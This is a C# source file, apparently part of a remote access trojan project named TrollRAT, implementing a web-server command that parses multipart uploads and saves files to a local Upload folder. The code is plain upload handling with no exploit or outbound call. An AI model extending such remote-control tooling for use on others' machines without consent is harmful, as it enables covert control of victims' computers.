using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;

namespace TrollRAT.Server.Commands
{
    public class UploadCommand : WebServerCommandBase
    {
        public override Regex Path => new Regex("^/upload$");
        public static readonly string uploadDir = System.IO.Path.GetFullPath("Upload");

        public string UploadDir
        {
            get
            {
                if (!Directory.Exists(uploadDir))
                    Directory.CreateDirectory(uploadDir);

                return uploadDir;
            }
        }

        internal int readBinaryUntilCRLF(Stream input, byte[] output, int maxSize, out bool crlf)
        {
            byte x1 = 0, x2 = 0; int i = 0;

            for (; (x1 != '\r' || x2 != '\n') && i < maxSize; i++)
            {
                x1 = x2;
                int b = input.ReadByte();

                if (b == -1)
                {
                    crlf = false;
                    return i;
                }

                x2 = (byte)b;
                output[i] = x2;
            }

            crlf = x1 == '\r' && x2 == '\n';
            return i;
        }

        internal string readBinaryLine(Stream input)
        {
            byte[] output = new byte[8192];
            bool crlf;

            int read = readBinaryUntilCRLF(input, output, output.Length, out crlf);

            return Encoding.ASCII.GetString(output, 0, read);
        }

        public override void execute(HttpListenerContext context)
        {
            try
            {
                Stream input = new BufferedStream(context.Request.InputStream);

                byte[] end = new byte[1024];
                bool crlf;
                int endLength = readBinaryUntilCRLF(input, end, end.Length, out crlf);

                string line = null;
                string filename = null;
                Regex regex = new Regex("filename=\"(.+?)\"");

                while ((line = readBinaryLine(input)).Length > 2)
                {
                    var match = regex.Match(line);
                    if (match.Success)
                    {
                        filename = match.Groups[1].Value;
                    }
                }

                if (filename != null)
                {
                    using (var output = File.Open(System.IO.Path.Combine(UploadDir,
                        System.IO.Path.GetFileName(filename)), FileMode.Create))
                    {
                        byte[] buf = new byte[8192];
                        byte[] oldbuf = buf;

                        int oldread = 0;

                        while (true)
                        {
                            int read = readBinaryUntilCRLF(input, buf, buf.Length, out crlf);

                            if ((crlf && buf.Take(endLength - 2).SequenceEqual(end.Take(endLength - 2))))
                                break;

                            if (oldread > 0)
                                output.Write(oldbuf, 0, oldread);

                            oldbuf = (byte[])buf.Clone();
                            oldread = read;
                        }

                        output.Write(oldbuf, 0, oldread - 2);
                    }
                } else
                    context.Response.StatusCode = 400;
            } catch(Exception)
            {
                context.Response.StatusCode = 500;
            }
        }
    }
}
